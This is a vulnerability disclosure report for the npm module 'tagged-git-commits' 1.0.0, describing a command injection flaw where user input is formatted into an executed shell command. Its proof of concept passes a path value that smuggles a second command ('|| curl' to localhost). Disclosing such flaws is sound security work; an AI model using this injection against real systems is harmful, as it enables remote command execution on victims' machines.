## Details
I would like to report a `RCE` issue in the `tagged-git-commits` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

## Module
* **module name:** `tagged-git-commits`
* **version:** `1.0.0`
* **npm page:** `https://www.npmjs.com/package/tagged-git-commits`

## Module Description
> Get the commit hash and refs/tags of tagged commits, remote and local

## Vulnerability Description

The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/aichbauer/node-tagged-git-commits/blob/master/index.js#L29

## PoC

```js
// poc.js
const taggedCommits = require('tagged-git-commits');

taggedCommits({
	path: './git || curl "http://localhost/RCE"',
});
```

## Impact
`RCE` on `tagged-git-commits` via `insecure command formatting`
